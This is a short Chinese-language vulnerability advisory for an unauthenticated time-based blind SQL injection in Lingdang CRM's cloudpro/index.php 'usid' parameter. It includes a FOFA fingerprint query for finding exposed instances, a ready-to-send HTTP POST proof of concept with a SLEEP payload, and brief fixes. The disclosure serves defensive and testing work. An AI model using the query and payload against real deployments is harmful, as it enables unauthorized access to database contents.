## 灵当CRM cloudpro/index.php SQL注入漏洞

## 漏洞描述
灵当CRM 微信云办公接口 `cloudpro/index.php` 在处理 `usid` 参数时直接拼接 SQL，未做登录校验，导致未授权攻击者可发起时间盲注，进一步获取数据库敏感信息。

## 影响范围
- 灵当CRM cloudpro 模块（版本待补充）

## 资产测绘
```
fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
```

## POC
```
POST /crm/weiXinApp/cloudpro/index.php HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

action=getMyAccount&usid=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a) -- -&my_cloudid=0
```
若响应延迟 ≥3 秒即可判断存在 SQL 注入。

## 修复建议
- 所有数据库查询改用预编译
- 接口增加登录鉴权与访问频率限制

